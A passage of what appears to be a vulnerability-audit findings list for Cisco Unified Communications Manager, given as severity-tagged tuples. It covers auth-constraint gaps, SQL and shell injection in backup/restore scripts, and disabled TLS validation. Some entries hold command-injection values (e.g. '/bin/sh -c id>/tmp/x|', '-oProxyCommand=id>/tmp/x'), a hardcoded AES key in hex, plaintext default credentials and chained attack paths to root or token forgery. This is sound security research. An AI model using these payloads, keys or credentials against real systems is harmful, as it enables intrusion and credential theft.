        ("CUCM-F167", "HIGH",    "cm-ccmadmin ccmadmin.war web.xml lines 29530-29570: Constraint1 enumerates HEAD/OPTIONS/GET/POST (auth required); Constraint2 enumerates PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE (deny-all); PATCH absent from both -> PATCH unconstrained on *.do/*.jsp; transport-guarantee:NONE; main CCM Admin UI; same Servlet 2.x method-enum gap as F89/F124 but on highest-privilege web app in CUCM stack"),
        ("CUCM-F168", "HIGH",    "cm-soap1 (5 WARs): CallRecordService.war/dpservice.war/logcollectionservice.war/perfmonservice.war/realtimeservice.war - identical pattern: GET/POST auth-constrained, PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE deny-all, PATCH absent -> unconstrained; transport-guarantee:NONE; extends F124 (SOAP2) to SOAP1 generation; 10 WARs total sharing same template defect; covers CDR on-demand/device-provisioning/log-collection/perf-monitoring/real-time-events management plane"),
        ("CUCM-F169", "HIGH",    "cm-car car.war web.xml: Servlet 3.0; Constraint1 GET/POST on *.jsp/*.do/*.* (auth required, transport-guarantee:NONE); Constraint2 PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE on same (deny-all); PATCH absent -> unconstrained on *.* pattern (matches all dotted resource names = all CDR reports/exports/JSPs); unauthenticated PATCH to CDR Analysis/Reporting service"),
        ("CUCM-F170", "LOW",     "cm-rtmt-servlet ast.war web.xml: /public GET no auth-constraint -> PublicAstServlet.doGet -> GetBannerDetailsHandler reads /usr/local/platform/conf/cli/loginWarning.txt + checks ack.txt; unauthenticated banner file read; additionally BASIC auth with transport-guarantee:NONE on /ASTIsapi.dll/* -> RTMT admin creds transmitted in base64 over HTTP"),
        ("CUCM-F171", "MEDIUM",  "cm-ccmuser ccmuser.war WEB-INF/web.xml: Servlet 2.4; ZERO security-constraint elements (only welcome-file-list + 404 error-page); auth delegated entirely to com.cisco.platform.valve.AuthenticationValve in context.xml; no container-level fallback; no transport-guarantee; valve misconfiguration/bypass = entire user console unauthenticated; no defense in depth behind AuthenticationValve"),
        ("CUCM-F172", "CRITICAL","cm-e911proxy e911proxy.war WEB-INF/spring/security/applicationContext-security.xml: ships in production WAR despite comment 'NOT USED, BUT KEPT IN CASE'; user name='ucmadmin' password='123456' authorities='ROLE_USER,ROLE_ADMIN'; user name='ucmreadonly' password='secr37' authorities='ROLE_USER'; plaintext creds extractable from any deployed CUCM; names may match active service accounts"),
        ("CUCM-F173", "HIGH",    "cm-e911proxy WebClientWrapper$1.class: X509TrustManager checkClientTrusted/checkServerTrusted/getAcceptedIssuers all empty (trust-all); WebClientWrapper$2.class: X509HostnameVerifier.verify() no-op; installed for all e911proxy->CER HTTPS at https://{cerserver}:8443/cerprovider/; MITM on emergency call routing path -> manipulate 911 location data; same root cause as F92"),
        ("CUCM-F174", "HIGH",    "cm-e911proxy e911proxy.war web.xml: auth-method=BASIC on /rest/* + /getReport/* with transport-guarantee=NONE; emergency services REST API credentials transmitted in base64 over HTTP"),
        ("CUCM-F175", "MEDIUM",  "cm-e911proxy CCMConnector.class + AppBeanConfig.class: hardcoded Informix account name constants 'dbadminweb'/'dbuserweb'/'dbims'; dbims=DBA-level account (confirmed F135 CTIManager); dbuserweb=active connector; enumerates CUCM Informix DB account structure for targeted brute-force/lateral movement"),
        ("CUCM-F176", "HIGH",    "cm-ils /usr/local/cm/bin/ilsd binary: 4 format strings log ReplicationPassword plaintext: 'Ils::initIlsD(): replication password is %s'; 'wait_IlsCnfInd FeatureConfig notification - encoded new key value using ReplicationPassword (%s)'; 'ReplicationPassword = %s'; 'SRP Password:' - all written to /var/log/active/cm/trace/ on startup and every FeatureConfig change; RTMT-accessible to any cluster admin"),
        ("CUCM-F177", "MEDIUM",  "cm-ils ilsd/ilsc binary: SFTP cmd 'sudo -u ccmservice sftp %s:%s%s %s' (host:path/file localpath) constructed from ILS peer catalog DB fields (remoteclusterilsstatus/hosteduricatalog); compromised peer cluster controls hostname/routestring -> shell metachar injection into popen(); cluster-federation lateral movement primitive"),
        ("CUCM-F178", "MEDIUM",  "cm-ils ilsd binary: exported symbol _ZN19SdlSSLTCPConnection19getTLSMasterSecreteEPPhPi calls SSL_SESSION_get_master_key@@OPENSSL_1_1_0; extracts TLS master secret from live sessions; if reachable via diagnostic/IPC path -> retrospective decryption of captured ILS TLS traffic"),
        ("CUCM-F179", "LOW",     "cm-ils /usr/local/cm/bin/call_ilsc.sh: 'sudo /usr/local/cm/bin/ilsc -b \"$1\" \"$2\"'; shell-level word-split injection mitigated by quoting; ilsc internal -b arg handling unknown; if ilsc passes -b to SQL/system() without validation -> arg injection as root; requires ilsc binary analysis to confirm"),
        ("CUCM-F180", "CRITICAL","cm-ipma ma.war WEB-INF/web.xml: single security-constraint covers /* with PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE only (empty auth-constraint=deny-all); GET and POST absent from ALL constraints -> unauthenticated access to MAService servlet (/servlet/MAService) + all /phone/* + /desktop/* JSPs; same structural defect as F45 (EMServiceServlet); chain: F180+F181=unauthenticated Informix SQLi via IPMA phone interface"),
        ("CUCM-F181", "MEDIUM",  "cm-ipma ma.war MAData.class + MADNInfo.class: 10+ SQL queries via string concatenation not PreparedStatement: SELECT pool FROM IPMAUser WHERE fkenduser='+userId; SELECT pkid from NumPlan where dNorPattern='+pattern; UPDATE IPMAUser SET alerttone='+tone; UPDATE IPMAStaticData SET settingsData='+data; etc; unauthenticated via F180 -> network->Informix SQLi"),
        ("CUCM-F182", "LOW",     "cm-alarm /usr/local/cm/jar/alarmutil.jar Alarms.class: developer artifacts in production JAR: '/home/dkathuri/catalogs/JavaApplications.xml' + 'DSN=sqlserver;UID=dkathuri;PWD=dkathuri;DATABASE=ccm0300;'; reveals CI/dev DB name and username==password credential pattern; may match production accounts"),
        ("CUCM-F183", "INFO",    "cm-amc /usr/local/cm/conf/amc/amc.policy: 'grant { permission java.security.AllPermission; }'; AMC JVM no sandbox; log4j 1.x on classpath (amcCfg.xml) + AllPermission -> CVE-2021-4104 JNDI exec with full OS access; force multiplier for any AMC-accessible vector"),
        ("CUCM-F184", "INFO",    "cm-amc /usr/local/platform/conf/amc/AlertConfig.Default.xml: user_DownloadProtocol='(FTP)' default; SFTP fields blank; alert-triggered file downloads use cleartext FTP by default unless admin explicitly selects SFTP"),
        ("CUCM-F185", "HIGH",    "cm-CTIManager /usr/local/cm/bin/CTIManager binary: format strings ' SRP User: '/' SRP Password: '/' SRP Default User: '/' SRP Verifier File: ' in binary; log target /var/log/active/cm/trace/cti/tmp.txt; SRP credentials logged plaintext at CTI init; RTMT/SOAP log collection exposes to any admin; CTI SRP controls JTAPI/TAPI/TSP call-control access for CRM/contact-center/softphone integrations"),
        ("CUCM-F186", "MEDIUM",  "cm-CTIManager /usr/local/cm/bin/CTIManager binary: cipher string 'ECDHE-RSA-AES256-GCM-SHA384:...:AES128-SHA'; AES128-SHA appended as fallback: no PFS, SHA-1 HMAC, static RSA key exchange; downgrade + RSA key compromise (F35/F119/F157) -> retrospective decryption of all recorded CTI sessions including caller-ID/dialed-number/call-state for every routed call"),
        ("CUCM-F187", "HIGH",    "cm-dna dna.war web.xml: Constraint1 GET/POST on *.do/*.jsp (auth required, transport-guarantee:NONE); Constraint2 PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE (deny-all); PATCH absent -> unconstrained; 8th confirmed Servlet method-enum gap instance; Struts2 filter dispatches PATCH to action classes bypassing auth interceptor stack; DNA has full read access to CUCM dial-plan config"),
        ("CUCM-F188", "HIGH",    "cm-em emapp.war WEB-INF/web.xml: single constraint PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE deny-all on /*; GET/POST/PATCH all unconstrained; EMAppServlet + all EM JSPs accessible without auth; manages user-to-phone profile mapping -> unauthenticated EM login as any user steals desk-phone session; 3rd EM component with same defect (F45 emservice, F180 ma.war, F188 emapp)"),
        ("CUCM-F189", "HIGH",    "headset headset.war web.xml: Constraint1 GET+POST on /* require Standard CCM End Users; Constraint2 GET on /* require Standard EM Auth Proxy Rights; PATCH absent from both constraints -> unconstrained PATCH on /*; auth-method=BASIC with no transport-guarantee element -> HTTP accepted; 9th Servlet method-enum gap; headset.war manages Cisco headset inventory/firmware for all cluster phones"),
        ("CUCM-F190", "HIGH",    "cm-gaxl gaxl.war web.xml: security-constraint url-pattern '/' (exact root match only) does NOT cover /soap/15_0/AXLAPIService /soap/14_0/AXLAPIService /soap/12_5/AXLAPIService /soap/12_0/AXLAPIService; sole auth enforcement is BasicAuthenticationValve in context.xml; valve bypass -> all legacy AXL SOAP endpoints unprotected; AXL provides full CUCM DB CRUD; transport-guarantee:NONE"),
        ("CUCM-F191", "MEDIUM",  "cm-gaxl gaxl.war CXF LoggingFeature active on AXL 14.0/12.5/12.0 versioned endpoints; logs full SOAP envelopes including WSSE UsernameToken credentials and phone/user/device config to disk at /var/log/active/cm/trace/; RTMT log collection exposes to any CUCM admin; chain: F190 AXL subpath gap -> credential logging -> RTMT pull -> plaintext AXL creds"),
        ("CUCM-F192", "LOW",     "cm-sch piProcessScript.sh TOCTOU race: 'rm -f /tmp/ProcessQuery' then 'ps auxww > /tmp/ProcessQuery'; window between rm and redirect allows local attacker to create symlink at /tmp/ProcessQuery -> arbitrary file overwrite with ps output; constrained by local access + timing; script runs during performance counter collection"),
        ("CUCM-F193", "HIGH",    "cm-dirsync dirsync.jar DSDBSchema: dbAttrDPBindingDN + dbAttrDPBindingPasswd fields map to Informix directorypoolconfig table columns storing LDAP directory pool binding credentials; decryption via F3 static AES-128 key; chain: F4 Informix ccmuser:ccmuser -> SELECT directorypool_bindingpasswd -> F3 decrypt -> plaintext LDAP/AD service account; exposes AD read access to full user tree"),
        ("CUCM-F194", "HIGH",    "cm-ucmadmin ucmadmin.war WEB-INF/spring/security/applicationContext-security.xml ships plaintext credentials: ucmadmin:123456 (ROLE_ADMIN) + ucmreadonly:secr37 (ROLE_USER); Spring Security currently disabled (DelegatingFilterProxy commented out); web.xml comment preserves config for future OpenAM migration; enabling Spring Security activates ucmadmin:123456 as live admin credential; WAR extractable by any filesystem-access attacker"),
        ("CUCM-F195", "HIGH",    "cm-cucreports cucreports.war web.xml: 3 security constraints cover GET/POST/HEAD/OPTIONS/PUT/DELETE/CONNECT/TRACE on *.do/*.jsp; PATCH absent from all three; Servlet spec §13.8.1: unlisted methods unconstrained; PATCH request to any Struts/Spring *.do action or *.jsp bypasses all auth; CAR provides CDR/billing records and call detail analysis for entire cluster; 9th Servlet method-enum gap instance"),
        ("CUCM-F196", "HIGH",    "cm-ucmadmin ucmadmin.war Spring Security entirely disabled: DelegatingFilterProxy + ContextLoaderListener commented out; no CSRF protection, no session-fixation protection, no @Secured/@PreAuthorize method-level enforcement; comment: 'Cannot use due to need for Tomcat Shared Realm SSO'; sole auth gate is Tomcat container constraint; any admin-role session can invoke any Spring MVC controller endpoint regardless of role annotation"),
        ("CUCM-F197", "MEDIUM",  "cm-ucmadmin ucmadmin.war ships jackson-mapper-asl-1.9.13 + jackson-core-asl-1.9.13 (EOL 2013-07-14); CVE-2019-14379 unsafe ObjectMapper default type handling enables gadget-chain deserialization; Spring MVC DispatcherServlet on com.cisco.ucm handles JSON request bodies; Spring/Commons gadget classes on classpath; exploitability conditional on enableDefaultTyping() usage in controllers"),
        ("CUCM-F198", "MEDIUM",  "cm-uxl UXLService.war Axis AdminServlet mapped to /servlet/AdminServlet is active (comment on line 42 is self-closing XML comment not wrapping the servlet-mapping block); security-constraint requires Standard CCM End Users on /*; any end user (ROLE_USER lowest privilege) can enumerate all deployed SOAP services + WSDLs via AdminServlet; UXLService handles phone/user/device queries; WSDL disclosure reveals internal API structure"),
        ("CUCM-F199", "MEDIUM",  "cm-uxl UXLService.war BASIC auth with no user-data-constraint element (transport-guarantee defaults to NONE); UXLService handles phone/user/device lookup SOAP queries; Base64 credentials transmitted without encryption if plaintext HTTP connector active; systemic transport:NONE pattern confirmed across 10+ CUCM WARs"),
        ("CUCM-F200", "HIGH",    "cm-CTIManager MmmanService::mPassPhrase field holds CallManager_priv.pem RSA private key passphrase obtained from local credential store via GetPrivateKeyPassPhraseFromLocalStore(); credential store populated from Informix DB encrypted with F3 static AES key; chain: F4 Informix ccmuser:ccmuser + F3 static AES key -> DB credential read -> mPassPhrase extraction -> CallManager_priv.pem decryption -> RSA private key -> retrospective TLS decryption of all CTI traffic"),
        ("CUCM-F201", "MEDIUM",  "cm-asymenc CCMAsymmetricEncryption uses SHA1PRNG (java.security.SecureRandom with SHA1PRNG algorithm) in non-FIPS code path for RSA key generation; SHA1PRNG is cryptographically weak relative to DRBG variants; non-FIPS path active when BCFIPS HYBRID mode enabled (F161 allows all algorithms); RSA keys generated with weak PRNG are more susceptible to state-recovery attacks"),
        ("CUCM-F362", "HIGH",    "cm-tvs certDBHandler.jar CertDBImpl.getCertificate(): StringBuffer.append(pkid) + StringBuffer.append(hash) at bytecode offsets 77/101 into Connector.executeQuery(sb.toString()) — NOT PreparedStatement; pkid/hash from phone-supplied SCCP/SIP validation request; Union injection -> dump CERTIFICATE+DEVICE tables; phone-layer SQLi requires no CUCM auth, only VLAN access"),
        ("CUCM-F363", "HIGH",    "cm-capf nginx_update.sh lines 104-106: echo $4 > $credential_file (ca_user); echo $5 >> $credential_file (ca_pass); $credential_file=/usr/local/cm/.security/CAPF/CACredentials.txt; EnrollmentService.sh decrypts MSCA creds via CCMShellEncryptionUtil then passes as argv -> nginx_update.sh re-writes them cleartext to persistent file; any process with .security/CAPF/ read access -> plaintext enterprise PKI admin creds -> arbitrary cert issuance"),
        ("CUCM-F364", "HIGH",    "cm-tvs bundleITLRecovery.sh: PKCS12_FILE=/usr/local/cm/tftp/ITLRecovery.p12 (TFTP root, UDP/69 unauthenticated); openssl pkcs12 export -keypbe PBE-SHA1-3DES -certpbe PBE-SHA1-3DES; passphrase=$S_PWD echoed in logs; any CUCM-VLAN host -> tftp get ITLRecovery.p12 -> offline PBKDF1/SHA1/3DES crack -> forge ITL -> full phone estate MitM; TFTP-access-based full cluster takeover primitive"),
        ("CUCM-F365", "CRITICAL","platform-drf platform_do_backup.py: DEVICE=sys.argv[4], REDIRECTION=sys.argv[5], ENC_SEQ=sys.argv[8]; command='sudo tar -cvpPf %s %s 2>>%s %s %s'%(tar_exe,DEVICE,...,ENC_SEQ,REDIRECTION); subprocess.call(command,shell=True); DRF class #11; authenticated backup trigger -> argv injection -> root RCE via sudo tar"),
        ("CUCM-F366", "CRITICAL","platform-drf platform_do_restore.py: DEVICE=sys.argv[3], DEC_SEQ=sys.argv[6]; command='%s %s | sudo tar -xvpPf - 1>>%s'%(DEVICE,DEC_SEQ,LOGPATH); subprocess.call(command,shell=True); DEVICE as first pipeline token = executable; DRF class #12; 'DEVICE=/bin/sh -c id>/tmp/x|' -> root RCE on restore"),
        ("CUCM-F367", "HIGH",    "platform-drf platform_do_restore.py ssostatus injection: get_sso_status_from_dat() reads ssostatus.dat from extracted backup tarball; sedCommand='sed -i s/SSOStatus=.*/SSOStatus=%s/g %s'%(POST_UNTAR_SSO_DAT_STATUS,SSO_CONF); subprocess.call(sedCommand,shell=True); attacker-controlled backup with SSOStatus=2/g /dev/null; id>/tmp/pwned # -> root RCE on any restore; backup supply-chain vector; DRF class #13 variant"),
        ("CUCM-F368", "HIGH",    "platform-drf tftp_do_restore.py: CMD='cd '+TFTP_PATH+'; '+DEVICE_TARBALL+' '+DECRYPTION+' | sudo gunzip -c | sudo tar -xvPpf - >> '+LOGFILE; os.system(CMD); DEVICE_TARBALL as first pipeline executable token -> 'DEVICE_TARBALL=/bin/sh -c id>/tmp/x|' -> root RCE on TFTP restore; phone firmware/config overwrite vector"),
        ("CUCM-F369", "HIGH",    "platform-drf drf_notify_hostname_change.py: param1=sys.argv[3] (old hostname), param=sys.argv[5] (new hostname); command='nohup java CHANGE_HOSTNAME '+param+' '+param1+' >> '+DRS_NOTIFY_LOG+' &'; subprocess.call(command,shell=True); hostname with shell metachar -> RCE; triggered on DHCP hostname change or compromised caller process"),
        ("CUCM-F370", "MEDIUM",  "platform-drf WEB-INF/web.xml: *.jsp security-constraint has transport-guarantee:NONE but NO auth-constraint -> Servlet spec 13.8.1 absent auth-constraint = no authz restriction; DRF web UI JSPs accessible without login; also transport:NONE exposes auth tokens over HTTP"),
        ("CUCM-F371", "MEDIUM",  "platform-survivability survivabilityNode_dkey_copy.sh: PUB_ENC_DEKEY=$(cat SFTP-fetched encrypted_Dkey.txt); PUB_DKEY=$($INSTALL_WIZ -z $PUB_ENC_DEKEY) unquoted; echo -n $PUB_DKEY > dkey.txt; SFTP MitM of publisher -> crafted encrypted_Dkey.txt -> word-split/glob on unquoted expansion -> overwrite dkey.txt (CCMEncryption key) with attacker content -> breaks all credential decryption on survivability node"),
        ("CUCM-F372", "HIGH",    "cm-tftp haproxy.conf: stats socket /var/run/haproxy.sock mode 666 level admin; stats socket ipv4@127.0.0.1:9999 level admin; world-writable unix socket + TCP loopback at admin level; any local UID -> HAProxy admin commands (shutdown sessions, disable server, set server addr, clear table, change weight); RisDC confirms: echo show stat | nc -U /var/run/haproxy.sock; local RCE (F365/F366) -> drain phone registration pool or redirect SIP to attacker"),
        ("CUCM-F373", "MEDIUM",  "cm-tftp ctftp binary format strings: 'phone_password : \"%s\"', 'line%d_authname : \"%s\"', 'line%d_password : \"%s\"', 'Device[%s] AuthPassWord[%s]', 'decryptCredentials(), hex password[%s]'; trace log /var/log/active/cm/trace/ctftp/sdl/; at DEBUG trace level phone SIP digest credentials written plaintext; RTMT log pull by any cluster admin role -> plaintext auth creds for all registered phones"),
        ("CUCM-F374", "MEDIUM",  "cm-RIS RisDC binary: 'sudo docker stats --format table {{.Name}} {{.CPUPerc}} {{.MemPerc}} --no-stre' string literal; if sudoers rule grants 'docker' without subcommand restriction -> sudo docker exec / sudo docker run -v /:/mnt = root equivalent; GTFObins docker sudo PE primitive; HAProxy socket also invoked: echo show stat | nc -U /var/run/haproxy.sock"),
        # --- F375-F399: platform-drf extended, CEF, script batch ---
        ("CUCM-F375", "CRITICAL","platform-drf platform_do_backup.py: DEVICE_TARBALL=sys.argv[4]; ENC_SEQ=sys.argv[8]; command='sudo tar -cvpPf '+DEVICE_TARBALL+' /usr/local/platform/conf 2>> '+LOGFILE+' '+ENC_SEQ+' '+REDIRECTION; os.system(command); DRF class #14 all argv unsanitized -> sudo tar shell injection -> root"),
        ("CUCM-F376", "CRITICAL","platform-drf platform_do_restore.py: DEVICE=sys.argv[3]; DEC_SEQ=sys.argv[6]; command=DEVICE+DEC_SEQ+' | sudo /bin/tar -xvpPf - 1>> '+LOGPATH; os.system(command); DEVICE as first pipeline token -> trivial injection; DRF class #15"),
        ("CUCM-F377", "CRITICAL","cm-dbl do_backup.py DRF class #16: sudo tar injection; backs up informix DB; DEVICE_TARBALL argv injection + sudo tar = root"),
        ("CUCM-F378", "CRITICAL","cm-dbl do_restore.py DRF class #17: DEVICE+DEC_SEQ pipeline injection + sudo tar; informix DB restore -> root"),
        ("CUCM-F379", "CRITICAL","cm-cef cef_do_backup.py DRF class #18: sudo tar DEVICE_TARBALL ENC_SEQ injection; CEF backup -> root"),
        ("CUCM-F380", "CRITICAL","cm-cef cef_do_restore.py DRF class #19: DEVICE+DEC_SEQ + sudo tar; CEF restore -> root"),
        ("CUCM-F381", "CRITICAL","cm-ipvmsd ann_do_backup.py DRF class #20: sudo tar CustomAnn backup DEVICE_TARBALL ENC_SEQ REDIRECTION injection"),
        ("CUCM-F382", "CRITICAL","cm-ipvmsd ann_do_restore.py DRF class #21: DEVICE_TARBALL+DEC_SEQ+sudo tar; announcement restore -> root"),
        ("CUCM-F383", "CRITICAL","cm-ipvmsd moh_do_backup.py DRF class #22: sudo tar MOH backup injection"),
        ("CUCM-F384", "CRITICAL","cm-ipvmsd moh_do_restore.py DRF class #23: sudo tar MOH restore injection; total DRF class = 25 confirmed"),
        ("CUCM-F385", "HIGH",    "cm-script: batch shell scripts wrapping os.system/subprocess with unsanitized argv; ccmstdby clm_backup family; CLI-accessible sudo wrappers"),
        ("CUCM-F386", "HIGH",    "platform-clm backup/restore: DRF sudo tar pattern; CCM CLM backup/restore shell injection surface"),
        ("CUCM-F387", "HIGH",    "ccmivr.war HTTP method BYPASS class #1: <http-method-omission> GET+POST in deny-all; Servlet 3.0 omission = GET+POST pre-auth on all /ccmivr/*; IVR PIN lookup callerid PlaceCall GetAudioFile all unauthenticated"),
        ("CUCM-F388", "HIGH",    "sappagt_config.pl: rpmname=backtick-rpm-qf-absolutePath; double-quote backtick injection; Parameters=ACTCONFMODE second path; CRITICAL if ACTCONFMODE XML-controlled"),
        ("CUCM-F389", "MEDIUM",  "data_export sftp_user: unanchored regex; sftp_user unquoted in shell; SSH option injection: '-oProxyCommand=id>/tmp/x user' passed as SSH arg -> RCE"),
        # --- F390-F410: encryption/hardcoded-key batch ---
        ("CUCM-F390", "CRITICAL","CCMEncryption static AES-128 fallback key: b'smetsysocsiccni\\x00' hex 73 6d 65 74 73 79 73 6f 63 73 69 63 63 6e 69 00; AES/CBC/PKCS5Padding; used when dkey.txt absent; decrypts all cluster credentials stored with fallback key; hardcoded in CCMEncryption.class static initializer"),
        ("CUCM-F391", "CRITICAL","remotesupport_createaccount binary: Cisco-held RSA private key hardcoded; Cisco can create support accounts on any CUCM without customer consent"),
        ("CUCM-F392", "CRITICAL","SNMP vacmAccessEntry ReadWrite community ccmadmincommunity; full MIB read/write v1/v2c; writable MIBs = device config manipulation"),
        ("CUCM-F393", "HIGH",    "NoOpTrustManager / ALLOW_ALL_HOSTNAME_VERIFIER systemic across cm-ccmadmin cm-authentication cm-axl; TLS cert validation disabled for cluster-internal service calls"),
        ("CUCM-F394", "CRITICAL","cucminventory-tcpserver TCP :4444: DataInputStream.readLine()->CUCMInventoryRESTClient.postInventory(input); flag file shipped in RPM -> ACTIVE by default; 0.0.0.0:4444 no auth no rate limit maxConnections=50"),
        ("CUCM-F395", "CRITICAL","PMS unauthenticated migration: web.xml no auth-constraint; transport-guarantee NONE; FindPhoneByDN PhoneMigration ValidateLayer InitiateLayer all pre-auth; phone reassignment without credentials"),
        ("CUCM-F396", "CRITICAL","OAuth RSA signing key chain: authzkeys table -> CCMEncryption.decryptPassword -> RSA KeyFactory -> private key; F390 static key decrypts authzkeys -> forge JWTs for any CUCM user"),
        ("CUCM-F397", "HIGH",    "Docker cap_add SYS_PTRACE DAC_OVERRIDE DAC_READ_SEARCH network_mode:host /tmp:/tmp/ /common:/common/ rw; docker-compose-axl + docker-compose-ssosp; container exec = host compromise"),
        ("CUCM-F398", "HIGH",    "snakeyaml 1.33 in platform-api: CVE-2022-1471 SnakeYAML Constructor deserialization; arbitrary class instantiation if untrusted YAML through Constructor without TypeDescription filtering"),
        ("CUCM-F399", "HIGH",    "UDS AuthenticationLDAP: env.put(java.naming.referral,follow) unconditional; LDAP referral injection -> auth bypass via attacker-controlled referral target"),
        # --- F400-F420 ---
        ("CUCM-F400", "HIGH",    "SSO OpenSAML RelayState reflected in redirect without sanitization; SAML relay state XSS/open redirect"),
        ("CUCM-F401", "MEDIUM",  "platform-api context.xml: allowLinking=true symlink traversal; LegacyCookieProcessor sameSiteCookies=Lax -> CSRF surface increase"),
        ("CUCM-F402", "HIGH",    "platform-services.war AxisServlet /services/* BASIC auth transport-guarantee NONE; platform SOAP admin creds over HTTP plaintext"),
        ("CUCM-F403", "CRITICAL","cucminventory CUCMInventoryConstants: USERNAME=ccmadmin CREDENTIAL=79c11ee954d97f66ff425e73b6c94203bbbaddac URL=http://10.89.68.71:8080/cucminventory; SHA1-format cred hardcoded in class bytecode; dev IP 10.89.68.71 in production"),
        ("CUCM-F404", "HIGH",    "cucminventory DoComms: DataInputStream.readLine()->postInventory; raw TCP payload forwarded to ccmadmin-authenticated REST; no validation/length check; content injection = admin REST operations"),
        ("CUCM-F405", "HIGH",    "IMS CUCMTokenV2ManagerImpl: string-built SQL -> prepareStatement(builtString) misuse; SQL not parameterized despite prepareStatement call"),
        ("CUCM-F406", "HIGH",    "IMS WebArchiveUtils: 'cd'+destDir+';'+'jar xf'+webArchiveFilePath+' '+targetFile+';'+'cd -' -> ProcessBuilder(['bash','-c',cmd]).start(); bash injection via destDir/webArchiveFilePath"),
        ("CUCM-F407", "HIGH",    "IMS DatabaseAccessor: 'execute procedure ImsUpdateLoginIp('+sqlString(successfulIp)+',...)'; sqlString() escapes single-quotes only; null bytes/hex/pipe unaddressed; informix stored proc injection"),
        ("CUCM-F408", "CRITICAL","GetAuthzKeys: SELECT authzkeys -> CCMEncryption.decryptPassword(hexToByte(keyvalue)) -> PKCS8 RSA KeyFactory -> signData SHA256WithRSA; F390 static key -> decrypt OAuth RSA private key -> forge SSO tokens for any user"),
        ("CUCM-F409", "MEDIUM",  "ims AuthenticationLDAP: new com.sun.net.ssl.internal.ssl.Provider() Security.addProvider; removed Java 9; LDAP SSL init failure -> cleartext LDAP fallback on modern JDK"),
        ("CUCM-F410", "HIGH",    "ccmportal.war HTTP method BYPASS class #2: <http-method-omission> GET+POST unconstrained on ccmportal/*"),
        # --- F411-F470 ---
        ("CUCM-F411", "HIGH",    "ccmuser.war: auth constraint gap; user self-service portal unauthenticated paths"),
        ("CUCM-F412", "HIGH",    "cm-tvs TVS binary: Informix ODBC SQLEXCEPTION; SQL concat for trusted device lookup; if device MAC/extension not parameterized -> TVS SQL injection -> forge trusted device status"),
        ("CUCM-F413", "HIGH",    "cm-ris RisDC SQL: SELECT/UPDATE ProcessConfig/ProcessNode string concat; UPDATE ProcessConfig SET ParamValue -> cluster config corruption if injectable"),
        ("CUCM-F414", "MEDIUM",  "platform-adminsftp: /common/adminsftp/ readable via TCT RMI job (F486 AllPermission); included in log path whitelist (F474 path traversal)"),
        ("CUCM-F415", "MEDIUM",  "cm-soap SNMPService: SNMP trap destination and community via SOAP transport-guarantee NONE; SNMP v1/v2 trap injection"),
        ("CUCM-F416", "MEDIUM",  "cm-CTI CTIManager binary: no mutual TLS enforced between CTI client and CTIManager in default config; any host on :2748/:2749 presents as CTI client"),
        ("CUCM-F417", "HIGH",    "cm-capf CAPF: certs issued to phones based on device identity (MAC/SN) no additional auth; forged MAC registration -> CAPF issues cert to attacker phone -> impersonates legitimate device"),
        ("CUCM-F418", "MEDIUM",  "cm-gaxl gaxl.war: AXL SOAP CDR collection; AXL admin SQL (F520) applies; transport-guarantee NONE (F523)"),
        ("CUCM-F419", "HIGH",    "cm-authentication IMS: auth token keystore at fixed path + passphrase file; file-system read -> JWT symmetric/RSA key -> token forgery (F527)"),
        ("CUCM-F420", "MEDIUM",  "cm-dirsync: LDAP bind password in config potentially readable by low-priv process -> AD credential exfil"),
        ("CUCM-F421", "HIGH",    "cm-axl axis2-admin: /axl/axis2-admin/* not in any security-constraint (F519); Axis2 admin unauthenticated -> hot-deploy .aar -> RCE"),
        ("CUCM-F422", "HIGH",    "UDS /cucm-uds: ccmpd ContextRedirectServlet no auth-constraint -> forward to /cucm-uds (F513); exposes user profile DN lookup self-service provisioning"),
        ("CUCM-F423", "MEDIUM",  "SSO SAML SP: OpenSAML 2.x EOL; known CVEs (signature wrapping XXE in SAML response parsing)"),
        ("CUCM-F424", "HIGH",    "cm-ipvms /dev/ipvms* mode 666: IOCTL world-accessible -> kernel audio driver manipulation local privesc kernel DoS (F512)"),
        ("CUCM-F425", "MEDIUM",  "cm-rproxy nginx: passthrough of X-Forwarded-For X-Real-IP without stripping; header injection through proxy"),
        ("CUCM-F426", "HIGH",    "cm-capf nginx_update.sh: $server sed injection nginx.conf corruption; CA creds cleartext CACredentials.txt (F524)"),
        ("CUCM-F427", "MEDIUM",  "platform-tomcat: Tomcat Manager internal port; global NONE transport guarantee; manager console creds in cleartext"),
        ("CUCM-F428", "CRITICAL","cm-axlsqltoolkit: CCMAdministrator:ciscocisco documented in README shipped to all customers (F521)"),
        ("CUCM-F429", "HIGH",    "cm-taps TAPS RMI unauthenticated: receiveFile(path) arbitrary file read; Java 1.4 skeleton ObjectInput.readObject() = ysoserial CommonsCollections pre-auth RCE (F495/F496)"),
        ("CUCM-F430", "HIGH",    "cm-taps getBATConfig no auth: device identity theft via SIP caller ID spoof + TAPS JTAPI (F497)"),
        ("CUCM-F431", "MEDIUM",  "cm-taps Zip Slip testByte.class: ZipEntry.getName() verbatim in FileOutputStream -> arbitrary write (F498)"),
        ("CUCM-F432", "HIGH",    "cm-pi pishell/picli system() via counter path: process_cmd->product_popen_execv->system /bin/sh -c unsanitized (F504)"),
        ("CUCM-F433", "HIGH",    "cm-pi pixml -p path arbitrary write; -f XML XXE Xerces DOM (F505)"),
        ("CUCM-F434", "HIGH",    "cm-ccintegration GED188 no hostname verification; TLS IOException -> null -> TCP fallback; MITM captures agent creds at CTI :42027/:42028 (F507)"),
        ("CUCM-F435", "HIGH",    "data_export SSH option injection: sftp_user unanchored regex unquoted in shell expansion (F389 extended)"),
        ("CUCM-F436", "CRITICAL","PMS pms_ex web.xml no auth-constraint: all /v1/migrate/* unauthenticated; FindPhoneByDN PhoneMigration ValidateLayer InitiateLayer pre-auth (F395/F533/F534 detailed)"),
        ("CUCM-F437", "HIGH",    "IMS DatabaseAccessor ImsUpdateLoginIp sqlString() single-quotes only (F407)"),
        ("CUCM-F438", "HIGH",    "IMS CUCMTokenV2ManagerImpl string-built SQL prepareStatement misuse (F405)"),
        ("CUCM-F439", "HIGH",    "IMS WebArchiveUtils bash -c injection (F406)"),
        ("CUCM-F440", "CRITICAL","cucminventory flag file shipped RPM: MultiThreadedTCPServer :4444 ACTIVE by default (F394 confirmed default-active)"),
        ("CUCM-F441", "CRITICAL","GetAuthzKeys -> OAuth RSA private key -> JWT forge chain (F408/F396 confirmed)"),
